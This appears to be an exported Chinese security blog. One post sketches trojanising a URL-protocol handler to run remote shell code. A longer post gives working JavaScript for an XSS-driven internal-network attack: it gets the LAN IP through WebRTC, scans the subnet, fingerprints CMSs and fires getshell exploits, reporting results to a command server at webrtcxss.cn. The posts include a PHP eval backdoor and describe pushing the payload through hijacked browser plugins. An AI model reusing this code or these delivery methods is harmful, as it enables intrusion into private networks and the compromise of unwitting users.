{"meta":{"title":"Black-Hole's Blog","subtitle":"一个脱离了高级趣味的恋爱狗","description":"Black-Hole的博客,xss,csrf,web","author":"Black-Hole","url":"http://bugs.cc"},"pages":[{"title":"tags","date":"2017-04-03T07:32:09.000Z","updated":"2017-04-03T07:35:47.745Z","comments":false,"path":"tags/index.html","permalink":"http://bugs.cc/tags/index.html","excerpt":"","text":"安全: http://127.0.0.1:4000/tags/%E5%AE%89%E5%85%A8/ WEB安全: http://127.0.0.1:4000/tags/WEB%E5%AE%89%E5%85%A8/ 无线安全: http://127.0.0.1:4000/tags/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/ Other: http://127.0.0.1:4000/tags/Other/ 随笔: http://127.0.0.1:4000/tags/%E9%9A%8F%E7%AC%94/"},{"title":"links","date":"2017-04-03T07:54:52.000Z","updated":"2017-04-03T07:58:26.996Z","comments":true,"path":"links/index.html","permalink":"http://bugs.cc/links/index.html","excerpt":"","text":"LonelyRain 4ido10n VerFess"}],"posts":[{"title":"基于URLProtocol攻击的一些想法","slug":"基于URLProtocol攻击的一些想法","date":"2017-03-26T08:33:52.000Z","updated":"2017-03-26T08:34:42.000Z","comments":true,"path":"2017/03/26/基于URLProtocol攻击的一些想法/","link":"","permalink":"http://bugs.cc/2017/03/26/基于URLProtocol攻击的一些想法/","excerpt":"浏览器调起本地应用的原理是URLProtocol技术，详情可以在 http://www.cnblogs.com/wang726zq/archive/2012/12/11/UrlProtocol.html http://blog.csdn.net/zssureqh/article/details/25828683 里查看。 其中 在注册表的 [HKEY_CLASSES_ROOT]主键下，我们可以看到很多的URLProtocol。","text":"浏览器调起本地应用的原理是URLProtocol技术，详情可以在 http://www.cnblogs.com/wang726zq/archive/2012/12/11/UrlProtocol.html http://blog.csdn.net/zssureqh/article/details/25828683 里查看。 其中 在注册表的 [HKEY_CLASSES_ROOT]主键下，我们可以看到很多的URLProtocol。比如阿里旺旺的： 而阿里旺旺在网页端的和我联系按钮，是跳转到https://amos.alicdn.com/getcid.aw?v=3&amp;groupid=0&amp;s=1&amp;charset=utf-8&amp;uid=淘宝店铺名&amp;site=cntaobao&amp;groupid=0&amp;s=1&amp;fromid=cntaobao淘宝用户名链接的，而这个页面调用了下面的javascript代码： 123456789101112131415161718192021222324!function() &#123; var a = window, b = function() &#123; try &#123; window.open(\"\", \"_top\"), a.opener = null, a.close() &#125; catch(b) &#123;&#125; &#125;, c = function() &#123; a.location.href = \"aliim:sendmsg?touid=\" + a.site + a.touid + \"&amp;site=\" + a.site + \"&amp;status=1\", setTimeout(function() &#123; b() &#125;, 6e3) &#125;; a.isInstalled ? a.isInstalled(function(b) &#123; if (b) c(); else &#123; var d = confirm(\"\\u68c0\\u6d4b\\u5230\\u4f60\\u672a\\u5b89\\u88c5\\u963f\\u91cc\\u65fa\\u65fa\\u5ba2\\u6237\\u7aef,\\u662f\\u5426\\u8981\\u8df3\\u8f6c\\u5230\\u5b98\\u7f51\\u4e0b\\u8f7d?\"); d === !0 &amp;&amp; (a.location.href = \"https://wangwang.taobao.com\") &#125; &#125;) : c()&#125; (); 其中最核心的代码就是a.location.href = &quot;aliim:sendmsg?touid=&quot; + a.site + a.touid + &quot;&amp;site=&quot; + a.site + &quot;&amp;status=1&quot;代码，而这段代码的aliim就是在注册表的 [HKEY_CLASSES_ROOT]主键下的阿里旺旺主键名。 在上面的图中，我们可以看到当打开时，调用了&quot;D:\\Program Files (x86)\\AliWangWang\\8.60.03C\\wwcmd.exe&quot; %1命令，wwcmd.exe就是阿里旺旺处理网页端信息的API接口，当处理成功时，就会调起回话窗口。%1就是sendmsg?touid=&quot; + a.site + a.touid + &quot;&amp;site=&quot; + a.site + &quot;&amp;status=1&quot;这段参数。让我们替换下WWCmd.exe。看下是如何传递参数的： 1234567891011#include&lt;stdio.h&gt;int main(int argc,char **argv) &#123; FILE *fp = fopen(\"c:/123.txt\",\"w+\"); if(NULL == fp) return -1; while(argc--&gt;0)&#123; fputs(*++argv,fp); fputs(\" \",fp); &#125; return 0; &#125; 这段C语言代码是会把后面的参数另存为c盘下的123.txt文件，替换掉WWCmd.exe后，点击和我联系，C盘下存在了一个123.txt文件 发现，把aliim:也传递进去了，按照这个请求的话，我们可以构造一个exe程序，来进行接收参数了。个人能力有限，说说大体的思路吧。 exe程序替换掉原有的WWCmd.exe程序，然后来生成特定的插件，植入到浏览器里，然后用户每打开一个网站都会从服务器端接收一个特定的base64编码后的shell代码。然后执行aliim:cmd=服务端的base64，然后运行。当参数为sendmsg时，调起阿里旺旺，当为cmd时执行代码。这样的话，木马的隐藏及唤醒条件都达到了。同理迅雷下载等也都可以。 好处是在哪呢，一般来说浏览器调起阿里旺旺、迅雷等应用都会弹窗，但是一般用户都会点击 不在提示。这样的话，目标就打成了。 这只是一个思路，不太成熟。欢迎大家补充。","categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://bugs.cc/tags/安全/"}]},{"title":"浏览器插件的攻击向量","slug":"XSS自动化入侵内网","date":"2016-12-14T14:40:25.000Z","updated":"2016-12-15T03:37:31.354Z","comments":true,"path":"2016/12/14/XSS自动化入侵内网/","link":"","permalink":"http://bugs.cc/2016/12/14/XSS自动化入侵内网/","excerpt":"0x01 前言： 很多人都认为XSS只能做盗取cookies的活。以至于有些SRC、厂商对待反射型XSS视而不见，或者说是根本不重视。 直到“黑哥”在之前的演讲中提到XSS入侵内网，情况才得以好转。但是经过本人测试，黑哥所说的XSS内网入侵，应该是包含了浏览器漏洞。那没有浏览器漏洞该如何呢？就像0x_Jin之前在乌云报道的搜狐漏洞那样：http://www.wooyun.org/bugs/wooyun-2014-076685 这里有几个需要注意的地方：由于浏览器的同源策略问题导致没有办法做到真正意义上的内网入侵，当然如果你又浏览器的0day，那事情就另当别论了。 而0x_Jin在乌云中的那篇漏洞报告，我自己本人也去问了。答复就是只是检测了开放的80端口，就没有后续了。黑哥没有公布完整的代码，0x_Jin没有深入。既然都没有，就交给我吧。这里我将会使用其他办法“绕过浏览器的同源策略”。 0x02构架： 代码采用了类似XSS平台那种实时反馈机制。在这里我先把变量介绍一遍：12345678var onlyString = \"abc\";var ipList = [];var survivalIpLIst = [];var deathIpLIst = [];var sendsurvivalIp = \"http://webrtcxss.cn/Api/survivalIp\";var snedIteratesIpUrl = \"http://webrtcxss.cn/Api/survivalPortIp\";var snedIteratesCmsIpUrl = \"http://webrtcxss.cn/Api/survivalCmsIp\";var sendExistenceVul = \"http://webrtcxss.cn/Api/existenceVul\";","text":"0x01 前言： 很多人都认为XSS只能做盗取cookies的活。以至于有些SRC、厂商对待反射型XSS视而不见，或者说是根本不重视。 直到“黑哥”在之前的演讲中提到XSS入侵内网，情况才得以好转。但是经过本人测试，黑哥所说的XSS内网入侵，应该是包含了浏览器漏洞。那没有浏览器漏洞该如何呢？就像0x_Jin之前在乌云报道的搜狐漏洞那样：http://www.wooyun.org/bugs/wooyun-2014-076685 这里有几个需要注意的地方：由于浏览器的同源策略问题导致没有办法做到真正意义上的内网入侵，当然如果你又浏览器的0day，那事情就另当别论了。 而0x_Jin在乌云中的那篇漏洞报告，我自己本人也去问了。答复就是只是检测了开放的80端口，就没有后续了。黑哥没有公布完整的代码，0x_Jin没有深入。既然都没有，就交给我吧。这里我将会使用其他办法“绕过浏览器的同源策略”。 0x02构架： 代码采用了类似XSS平台那种实时反馈机制。在这里我先把变量介绍一遍：12345678var onlyString = \"abc\";var ipList = [];var survivalIpLIst = [];var deathIpLIst = [];var sendsurvivalIp = \"http://webrtcxss.cn/Api/survivalIp\";var snedIteratesIpUrl = \"http://webrtcxss.cn/Api/survivalPortIp\";var snedIteratesCmsIpUrl = \"http://webrtcxss.cn/Api/survivalCmsIp\";var sendExistenceVul = \"http://webrtcxss.cn/Api/existenceVul\"; onlyString ： 唯一字符串，用于让服务器识别当前发送的请求是哪一个项目，真实代码是不会写成abc的，会使用md5(date(‘Y-m-d H:i:s’))来生成hash。 ipList ： 数组变量用来储存webrtc获取的内网IP地址。 survivalIpLIst ： 数组对象用于存放开放80端口的IP地址 deathIpLIst ： 数组对象用于存放不存在80端口的IP，用于判断 sendsurvivalIp ： 发送当前内网IP的信息到服务端 snedIteratesIpUrl ： 从服务端反馈的cms路径对当前存在80端口的IP进行判断，看现有存活的IP地址是否可以在服务端里找到所匹配的CMS信息 snedIteratesCmsIpUrl ： 用于在已匹配到的cms信息里，从服务端里验证这个cms是否存在我们在服务端里所保存的getshell漏洞 sendExistenceVul ： 已确定漏洞，发送到服务端 之前在0x01前言里说到，这里我将会使用其他办法“绕过浏览器的同源策略”。现在我就来说说如何构架、整段代码的构架把： WebRTC获取到内网IP-&gt;遍历内网存在80端口的IP地址-&gt;检测开放80端口IP属于哪一种CMS类型-&gt;利用getshell生成js文件-&gt;是否存在js文件-&gt;存在JS文件-&gt;发送到服务端，漏洞存在-&gt; -&gt;不存在JS文件-&gt;漏洞不存在，结束。详情请移步到：https://www.processon.com/view/link/5711cdc6e4b0d7e7748c34ec 0x03获取内网的IP信息： 详情请移步到：https://webrtc.org/faq/#what-is-webrtc因为WebRTC让JavaScript具有了一定的底层操作方法，而由于WebRTC的特殊性，让我们可以使用JavaScript来获取到内网IP。目前WebRTC支持的平台有：Chrome、Firefox、Opera、Android、IOS。实际测试的时候maxthon也是支持的（此处有伏笔）。WebRTC获取内网IP这段代码网上是可以找到的，而在这里需要修改一下。方便其他代码容易调用。然后就是webrtc的代码了：123456789101112131415161718192021222324252627282930313233var webrtcxss = &#123; webrtc : function(callback)&#123; var ip_dups = &#123;&#125;; var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection; var mediaConstraints = &#123; optional: [&#123;RtpDataChannels: true&#125;] &#125;; var servers = undefined; if(window.webkitRTCPeerConnection)&#123; servers = &#123;iceServers: []&#125;; &#125; var pc = new RTCPeerConnection(servers, mediaConstraints); pc.onicecandidate = function(ice)&#123; if(ice.candidate)&#123; var ip_regex = /([0-9]&#123;1,3&#125;(\\.[0-9]&#123;1,3&#125;)&#123;3&#125;)/; var ip_addr = ip_regex.exec(ice.candidate.candidate)[1]; if(ip_dups[ip_addr] === undefined) callback(ip_addr); ip_dups[ip_addr] = true; &#125; &#125;; pc.createDataChannel(\"\"); pc.createOffer(function(result)&#123; pc.setLocalDescription(result, function()&#123;&#125;); &#125;); &#125;, getIp : function()&#123; this.webrtc(function(ip)&#123; ipList.push(ip); &#125;); &#125;&#125;webrtcxss.getIp(); 现在我们来打印一下看看： 已经获取到了我当前主机的IP地址了。 0x04检测内网中开启了80端口的IP： 上一节的结尾可以看到webrtcxss.getIp();已经调用了WebRTC来获取到内网的IP信息，IP保存在ipList数组变量里。这里就要检测内网中所有开放80端口的IP了。这里我写了一个函数来把这一步放到函数里：1234567891011121314151617181920212223242526272829function iteratesIp()&#123; stage(1) ipAjax = new XMLHttpRequest(); ipAjax.open('POST', sendsurvivalIp, false); ipAjax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); ipAjax.send('survivalip='+ ipList.join(\"-\") + '&amp;onlystring=' + onlyString); for(var i = 0;i &lt; ipList.length;i++)&#123; incompleteIp = ipList[i].split(\".\"); incompleteIp.pop(); incompleteIp = incompleteIp.join(\".\"); for(var j = 1;j &lt; 255;j++)&#123; var ip = incompleteIp + \".\" + j; var imgTag = document.createElement(\"img\"); imgTag.setAttribute(\"src\",\"http://\" + ip + \"/favicon.ico\"); imgTag.setAttribute(\"onerror\",\"javascript:deathIpLIst.push('\"+ip+\"')\"); imgTag.setAttribute(\"onload\",\"javascript:survivalIpLIst.push('\"+ip+\"')\"); imgTag.setAttribute(\"style\",\"display:none;\"); document.getElementsByTagName(\"body\")[0].appendChild(imgTag); &#125; &#125;&#125;setTimeout(\"iteratesIp()\",20000);(function()&#123; if(deathIpLIst.length + survivalIpLIst.length == 254)&#123; snedIteratesIpData(survivalIpLIst); &#125;else&#123; setTimeout(arguments.callee,5000); &#125;&#125;)(); 至于其中的stage(1)是我自己写的一个函数，用于实时向服务端发送当前最新的运行情况，我们放到最后再说。1234ipAjax = new XMLHttpRequest();ipAjax.open('POST', sendsurvivalIp, false);ipAjax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");ipAjax.send('survivalip='+ ipList.join(\"-\") + '&amp;onlystring=' + onlyString); 这段代码是把当前获取到的内网IP发送到服务端，至于为什么要在ipList后面加上join(“-“)函数是因为WebRTC有时会把获取网关、VM虚拟机的IP也获取上来。1234567891011121314for(var i = 0;i &lt; ipList.length;i++)&#123; incompleteIp = ipList[i].split(\".\"); incompleteIp.pop(); incompleteIp = incompleteIp.join(\".\"); for(var j = 1;j &lt; 255;j++)&#123; var ip = incompleteIp + \".\" + j; var imgTag = document.createElement(\"img\"); imgTag.setAttribute(\"src\",\"http://\" + ip + \"/favicon.ico\"); imgTag.setAttribute(\"onerror\",\"javascript:deathIpLIst.push('\"+ip+\"')\"); imgTag.setAttribute(\"onload\",\"javascript:survivalIpLIst.push('\"+ip+\"')\"); imgTag.setAttribute(\"style\",\"display:none;\"); document.getElementsByTagName(\"body\")[0].appendChild(imgTag); &#125;&#125; 这段代码是遍历所有内网主机80端口的。我们来实际看下把： 后面的.104被我们去掉了。然后利用for循环来遍历192.168.1.1~192.168.1.254现在我们来运行1234567891011121314for(var i = 0;i &lt; ipList.length;i++)&#123; incompleteIp = ipList[i].split(\".\"); incompleteIp.pop(); incompleteIp = incompleteIp.join(\".\"); for(var j = 1;j &lt; 255;j++)&#123; var ip = incompleteIp + \".\" + j; var imgTag = document.createElement(\"img\"); imgTag.setAttribute(\"src\",\"http://\" + ip + \"/favicon.ico\"); imgTag.setAttribute(\"onerror\",\"javascript:deathIpLIst.push('\"+ip+\"')\"); imgTag.setAttribute(\"onload\",\"javascript:survivalIpLIst.push('\"+ip+\"')\"); imgTag.setAttribute(\"style\",\"display:none;\"); document.getElementsByTagName(\"body\")[0].appendChild(imgTag); &#125;&#125; 这段代码： 这是控制台的效果，我们来看下DOM发生了哪些变化把： 这里我使用的是http://192.168.1.xxx/favicon.ico来判断内网哪些IP开启了80端口，并且上面运行着站点。其中的onerror=&quot;javascript:deathIpLIst.push(&#39;192.168.1.xxx&#39;)&quot;是如果此IP没有开启80端口，或者开启了80端口，但是没有运行站点的话，就调用把当前的IP地址push到deathIpLIst变量里。如果存在的话就push到survivalIpLIst变量里，也就是这段代码：onload=&quot;javascript:survivalIpLIst.push(&#39;192.168.1.1&#39;)&quot;至于为什么要这么做呢，这里就要涉及一个坑了。浏览器是不会你加载了哪些图片就立刻告诉你哪些图片是可以访问，哪些图片是不能访问的，浏览器需要一个缓冲的时间。检测同一网段里254个主机是否存在favicon.ico，大约需要花费550000ms===550s约等于2.16535s/IP。也就是9.16多分钟。也就是全部检测完需要等待9.16分钟。这也是没办法的事，改变不了。至于下面为什么要使用setTimeout(&quot;iteratesIp()&quot;,20000);来延迟20秒执行呢，因为WebRTC获取IP需要一定的时间，其实几秒钟就好了。但是为了提高容错率我把时间提高到20秒的时间，如果你嫌慢，可以在文章结尾下载源代码，修改。还有一段代码是这样的：1234567(function()&#123; if(deathIpLIst.length + survivalIpLIst.length == 254)&#123; snedIteratesIpData(survivalIpLIst); &#125;else&#123; setTimeout(arguments.callee,5000); &#125;&#125;)(); 这就是为什么我之前要把80端口不存在的IP放到一个数组变量里，存在80端口的IP放到一个数组变量里。因为我不确定他们什么时候好，之前说的9.1分钟，只是一个大概时间，因电脑配置、内网通讯速度等其他的原因可能会提前，也可能会更慢。我无法做出保证。所以写了一段代码。下面我来说说这段代码的意思：123(function()&#123; /*coding*/&#125;)(); 是一段匿名函数，当代码运行到此处时会立刻执行此函数。函数里面首先是判断deathIpLIst.length + survivalIpLIst.length是否等于254。如果等于254则调用snedIteratesIpData函数，并把开启80端口并运行站点的IP作为参数发送过去。如果不等于说明浏览器还没有把所有的图片都给判断好。进入else分之。setTimeout(arguments.callee,5000);是延迟5秒钟运行arguments.callee。而arguments.callee的意思是当前函数。我们来实际看下： console.log打印了当前的函数，当然你也可以使用setTimeout(当前的函数名(),5000);来达到此效果，但是此方法对于匿名函数没有用。因为匿名函数是不存在名称的。如果学了递归的朋友们，应该会很好理解。说通俗点就是：每隔5秒钟运行此函数，直到所有img标签全部判断完成，才进行下一步的操作。 0x05确认内网存活主机的CMS信息： 上一节我们说到闭包里的if条件里true执行的snedIteratesIpData函数，现在我们就来说说这个函数里面是什么内容：1234567891011121314151617181920212223242526function snedIteratesIpData(ip)&#123; if(deathIpLIst.length == 254)&#123; return false; &#125; stage(2) ip = ip.join(\"-\") ipAjax = new XMLHttpRequest(); ipAjax.onreadystatechange = function()&#123; if(ipAjax.readyState == 4 &amp;&amp; ipAjax.status == 200)&#123; var cmsPath = JSON.parse(ipAjax.responseText).path; for(var key in cmsPath)&#123; for(var i = 0;i &lt; survivalIpLIst.length;i++)&#123; var scriptTag = document.createElement(\"script\"); scriptTag.setAttribute(\"src\",\"http://\" + survivalIpLIst[i] + cmsPath[key]); scriptTag.setAttribute(\"data-ipadder\",survivalIpLIst[i]); scriptTag.setAttribute(\"data-cmsinfo\",key); scriptTag.setAttribute(\"onload\",\"javascript:vulnerabilityIpList(this)\"); document.getElementsByTagName(\"body\")[0].appendChild(scriptTag); &#125; &#125; &#125; &#125; ipAjax.open('POST', snedIteratesIpUrl, false); ipAjax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); ipAjax.send('iplist='+ip+'&amp;onlystring='+onlyString);&#125; 为什么要在函数开始前写上if函数呢，因为在上一节中的闭包里存在一个bug。就是当所有内网IP中都没有开放80端口且不存在站点的情况下，deathIpLIst.length会为254。而survivalIpLIst.length会为0。那deathIpLIst.length + survivalIpLIst.length == 254的条件是为true的。为了避免此bug的发生，我们在snedIteratesIpData函数里加入123if(deathIpLIst.length == 254)&#123; return false;&#125; 当deathIpLIst.length等于254的时候，返回false。不再向下执行。因为所有代码的构架就是A调用B，C调用A，D调用C。当C返回false的时候，D是不会执行的。从上面的代码可以看到，返回false后。下面的代码都不会运行的。现在我们来看下ip = ip.join(&quot;-&quot;)这条代码的意思，是当内网中存在两条（包括两条）以上的IP地址时，使用join函数，传给服务端。方便服务端的接受及查看。服务端的反馈就像下面这样： 面来说说ajax请求的代码：12345678910111213141516171819ipAjax = new XMLHttpRequest();ipAjax.onreadystatechange = function()&#123; if(ipAjax.readyState == 4 &amp;&amp; ipAjax.status == 200)&#123; var cmsPath = JSON.parse(ipAjax.responseText).path; for(var key in cmsPath)&#123; for(var i = 0;i &lt; survivalIpLIst.length;i++)&#123; var scriptTag = document.createElement(\"script\"); scriptTag.setAttribute(\"src\",\"http://\" + survivalIpLIst[i] + cmsPath[key]); scriptTag.setAttribute(\"data-ipadder\",survivalIpLIst[i]); scriptTag.setAttribute(\"data-cmsinfo\",key); scriptTag.setAttribute(\"onload\",\"javascript:vulnerabilityIpList(this)\"); document.getElementsByTagName(\"body\")[0].appendChild(scriptTag); &#125; &#125; &#125;&#125;ipAjax.open('POST', snedIteratesIpUrl, false);ipAjax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");ipAjax.send('iplist='+ip+'&amp;onlystring='+onlyString); 发送内网中开放80端口且具有站点的ip地址，并同时发送唯一标识符。用于服务端验证。服务端接受后，发送json数据，服务端代码如下：1234$this-&gt;ajaxReturn(array( \"typeMsg\" =&gt; \"success\", \"path\" =&gt; $pathInfo,)); 然后使用if(ipAjax.readyState == 4 &amp;&amp; ipAjax.status == 200)来判断是否发送成功，成功后，把json里的path数据赋值cmsPath变量。用于后面的代码调用。首先进入for循环，cmsPath[‘key’]为当前的cms路径。然后再来套一个for循环，survivalIpLIst[i]为当前循环的IP地址。接下来就是建立一个script标签的DOM元素，其中的data-ipadder、data-cmsinfo是为了让后面的代码方便调用。onload = &quot; javascript:vulnerabilityIpList(this)&quot;是当这个地址存在的时候，调用的一个函数，下一节会说到。现在先让我们看看数据库在的cmsPath是什么样的把： 默认就这4个，更多的路径可以自行加入。为了方便测试，我在我家中的另一台电脑上部署了代码，只有index.php、/static/bbcode.js、vul/heihei.php、favicon.ico这几个文件。而在heihei.php文件里代码如下：12&lt;?php eval($_GET['a']); 为什么是这个呢，很简单。我手里面没有Discuz的getshell漏洞。为了徒省事。就这样把。而favicon.ico文件我也很随意的使用了dedecms的favicon.ico。后面测试的时候，还望不要见怪。现在我们来运行下代码看下会发生什么事情吧： 我在/static/bbcode.js文件里写入的是console.log(1)所有会在控制台反馈1。这只是测试的代码，真实的环境是不会这样的。现在我们来看下DOM元素有些改变把： 已经调用了，程序检测到只有http://192.168.1.103/static/js/bbcode.js符合。那么一旦成功调用js文件，就会执行onlod里的vulnerabilityIpList(this)代码。而vulnerabilityIpList函数代码就在下一节。 0x06 检测内网主机中的漏洞是否真实存在（上篇）： 下面就是vulnerabilityIpList函数的代码：123456789101112131415161718192021222324function vulnerabilityIpList(info)&#123; stage(3) ipAjax = new XMLHttpRequest(); ipAjax.onreadystatechange = function()&#123; if(ipAjax.readyState == 4 &amp;&amp; ipAjax.status == 200)&#123; var vulCmsInfo = ipAjax.responseText; var img = document.createElement(\"img\"); img.setAttribute(\"scr\",vulCmsInfo); img.setAttribute(\"style\",\"display:none;\"); document.getElementsByTagName(\"body\")[0].appendChild(img); setTimeout(function()&#123; var scriptTag = document.createElement(\"script\"); scriptTag.setAttribute(\"src\",\"http://\"+info.getAttribute('data-ipadder')+\"/1.js\"); scriptTag.setAttribute(\"data-cmsinfo\",info.getAttribute(\"data-cmsinfo\")); scriptTag.setAttribute(\"data-vulip\",info.getAttribute('data-ipadder')); scriptTag.setAttribute(\"onload\",\"javascript:vulConfirm(this)\"); document.getElementsByTagName(\"body\")[0].appendChild(scriptTag); &#125;,2000); &#125; &#125; ipAjax.open('POST', snedIteratesCmsIpUrl, false); ipAjax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); ipAjax.send('existenceCmsIp='+ info.getAttribute(\"data-ipadder\") + '&amp;existenceCmsInfo=' + info.getAttribute(\"data-cmsinfo\") + '&amp;onlystring=' + onlyString);&#125; 其中info参数是成功调用的script标签的DOM元素对象。首先让我们看下发送url的请求： existenceCmsIp参数是检测到cms类型的IP地址 existenceCmsInfo参数是检测到cms类型 onlystring参数是唯一标识符，用于服务器判断属于哪一个项目。 接下来让我们看下onreadystatechange里面的内容：12345678910111213var vulCmsInfo = ipAjax.responseText;var img = document.createElement(\"img\");img.setAttribute(\"scr\",vulCmsInfo);img.setAttribute(\"style\",\"display:none;\");document.getElementsByTagName(\"body\")[0].appendChild(img);setTimeout(function()&#123; var scriptTag = document.createElement(\"script\"); scriptTag.setAttribute(\"src\",\"http://\"+info.getAttribute('data-ipadder')+\"/1.js\"); scriptTag.setAttribute(\"data-cmsinfo\",info.getAttribute(\"data-cmsinfo\")); scriptTag.setAttribute(\"data-vulip\",info.getAttribute('data-ipadder')); scriptTag.setAttribute(\"onload\",\"javascript:vulConfirm(this)\"); document.getElementsByTagName(\"body\")[0].appendChild(scriptTag);&#125;,2000); 首先就是var vulCmsInfo = ipAjax.responseText;，把服务器返回的字符串赋值给vulCmsInfo变量。服务端的代码是：1234567891011121314151617181920212223/** 把客户端检测到存在CMS的IP加入到数据库中*/if(I('post.existenceCmsIp') == \"\" || I('post.existenceCmsInfo') == \"\" || I('post.onlystring') == \"\")&#123; $this-&gt;ajaxReturn(array( \"typeMsg\" =&gt; \"error\", ));&#125;$existenceCmsIp = I('post.existenceCmsIp');$existenceCmsInfo = I('post.existenceCmsInfo');$onlyString = I('post.onlystring');$existencecmsip = M('existencecmsip');$existenceData['inner_ip'] = $existenceCmsIp;$existenceData['cms'] = $existenceCmsInfo;$existenceData['onlystring'] = $onlyString;$existenceData['create_time'] = date('Y-m-d H:i:s');$existencecmsip-&gt;data($existenceData)-&gt;add();/** 获取数据库中的cms漏洞详情，发送给客户端*/$cmsvul = M('cmsvul');$vulInfo = base64_decode($cmsvul-&gt;where('cms=\"'.$existenceCmsInfo.'\"')-&gt;getField(\"vulinfo\"));echo \"http://\".$existenceCmsIp.$vulInfo;从代码中可以看到服务端返回的不是json数据，而是字符串，这个字符串是拼接好的url。这个url就是从获取到的IP地址加上服务器中调用属于cms漏洞的path路径。 然后使用img标签来发送get请求，用于触发此getshell漏洞。代码也就是：1234var img = document.createElement(\"img\");img.setAttribute(\"scr\",vulCmsInfo);img.setAttribute(\"style\",\"display:none;\");document.getElementsByTagName(\"body\")[0].appendChild(img); 至于为什么要使用setTimeout函数来延迟2秒钟执行，是因为之前也说过浏览器是无法同时判断那么多的img请求。因为这里只有一个所以我使用了2秒，真实情况下可以改为20秒。然后建立一个script标签，用于判断1.js是否生成成功，如果生成成功，就说明漏洞存在，交给下一个函数处理，如果不存在，就此打住。因为onload不会调用vulConfirm函数。至于为什么要判断1.js文件，就是我之前所说的getshell生成的代码。在数据中是这样的： 是一段base64密文，解开后，内容如下：/vul/heihei.php?a=system(&#39;echo 1 &gt;&gt; ../1.js&#39;);而在后端发送给前端的时候，我已经解密了。如同上面代码中：$vulInfo = base64_decode($cmsvul-&gt;where(&#39;cms=&quot;&#39;.$existenceCmsInfo.&#39;&quot;&#39;)-&gt;getField(&quot;vulinfo&quot;));而在浏览器中代码是这样： 接下来就是setTimeout函数的真正的用处了。请注意这段代码：scriptTag.setAttribute(&quot;src&quot;,&quot;http://&quot;+info.getAttribute(&#39;data-ipadder&#39;)+&quot;/1.js&quot;);在script中把src的赋值成检测目标站点是否存在1.js。如果存在就运行onload里的vulConfirm函数。而vulConfirm函数就在下一节。 0x07 检测内网主机中的漏洞是否真实存在（下篇）： vulConfirm函数的内容很简单，只有给服务端发送的代码。1234567function vulConfirm(cmsConfirmInfo)&#123; stage(4) ipAjax = new XMLHttpRequest(); ipAjax.open('POST', sendExistenceVul, false); ipAjax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); ipAjax.send('cms='+ cmsConfirmInfo.getAttribute(\"data-cmsinfo\") + '&amp;vulip='+ cmsConfirmInfo.getAttribute(\"data-vulip\") +'&amp;onlystring=' + onlyString);&#125; cms参数是存在漏洞的CMS信息 vulip是存在漏洞的IP地址 onlystring是唯一标识符，用于服务端判断 0x08 stage的作用： stage函数代码如下：123456function stage(num)&#123; var updataStage = document.createElement(\"img\"); updataStage.setAttribute(\"src\",\"http://webrtcxss.cn/Api/stage/onlystring/\"+onlyString+\"/updata/\"+num); updataStage.setAttribute(\"style\",\"display:none;\"); document.getElementsByTagName(\"body\")[0].appendChild(updataStage);&#125; 就是一个img标签，发送get请求到服务端，告诉服务端代码运行到哪里了。在平台中的反馈如图： 0x09 API后端代码： 后端使用了thinkphp框架。如果你想修改服务端接受的方式的话。请在/Application/Home/Controller目录下修改ApiController.class.php文件，就行了。里面的内容分为survivalIp、survivalPortIp、_empty、survivalCmsIp、existenceVul、stage模块。可根据JavaScript中的代码来做出相应的修改。如图： 0x10平台专属的API： 平台的api在/Application/Home/Controller目录下的RootApiController.class.php文件里。建立项目、删除项目、查询项目都在里面。如果你想修改JavaScript代码，就在建立项目中修改，如图： 修改起来很简单。平台运行起来如下图： 0x11数据库的结构： 一共具有7个表，如下： webrtc_cmspath用于存放检测cms类型的JavaScript路径 webrtc_cmsvul用于存放cms的getshell漏洞详情 webrtc_existencecmsip用于存放内网中哪些IP具有cms webrtc_existencevul用于存放内网中哪些IP具有的CMS有漏洞 webrtc_ipdatalist用于存放内网中所有开放80端口切具有站点的ip列表 webrtc_project用于存放项目信息 webrtc_survivaliplist用于存放当前主机的内网ip 0x12特殊的玩法： 之前在freebuf说过了，地址是：http://www.freebuf.com/articles/web/61268.html因为nginx或者apache有些管理员会使用日志看实时查看网站的流量，由于log日志看起来太丑，于是就有人想出web端实时的反馈网站流量。但是在记录user-agent等数据包格式的时候，没有做好过滤。从而导致攻击者修改自己的user-agent为XSS攻击字符串，再进行浏览网站的操作，网站管理员在查看的时候就会触发XSS，如果配合本章所讲的内容。就像下雨天吃着巧克力一样完美。其实并不一定非要是nginx或者apache，有些网站的后台写的程序中会使用后端语言而非nginx这种配置生成文件，他们会直接记录下你们的IP、user-agent。从而在后台方便查看。这个时候我们本章所说的内容就会排上用场。关于插件安全的话，请大家看下面这张图： 我控制了十多个maxthon插件作者的账户，现在具有30w的插件用户，而我可以随时随地的更改其中的代码，而我问了一下maxthon插件的官方人员，答复是： 即使你没有相关的插件作者用户。可以使用组简单的html+swf来写一个插件小游戏，一个星期就可以上千。这里我打个比方，10w用户都安装了我的插件。其中5w是已经工作的用户。2w是在公司电脑上使用maxthon并安装了插件，一旦打开maxthon浏览器，插件就会自动运行。而当插件发现有新版本时，会自动静默安装。然后就会运行我们的JavaScript代码，而我在0x03节的地方说到maxthon也是支持WebRTC的，但是这里会有坑。我不清楚是不是由版本引起的问题，在chrome下运行WebRTC代码时会显示一组IP，也是当前电脑的内网IP，而在maxthon下，会出现三组，可能不止三组。如图： 其中192.168.27.1是我电脑上的VM虚拟机的IP段。192.168.118.1也是VM虚拟机上的ip段。只有192.168.1.104才是当前真正的内网IP。所以在源程序里会出现join函数和对ipList变量的for循环。 0x13失败的思路： 思路一、 假设这里获取到的内网IP为192.168.21.104。根据for循环输出img、script标签可以获取到内网的所以存活IP地址（也可以探测port），但是这里有一个问题，就是JavaScript里怎么获取到其他内网的资源信息，因为跨域，ajax、iframe都不行。我昨天晚上问了0xJin，他是没有获取，只是扫的存活IP及端口。但是说好是内网漫游，不能只获取到当前触发XSS的Pc。昨天晚上查了一夜的资料，有个思路，但是不知道能不能实现。这里说明一下，如果有什么好的建议可以提出来。当然思路可能错误。 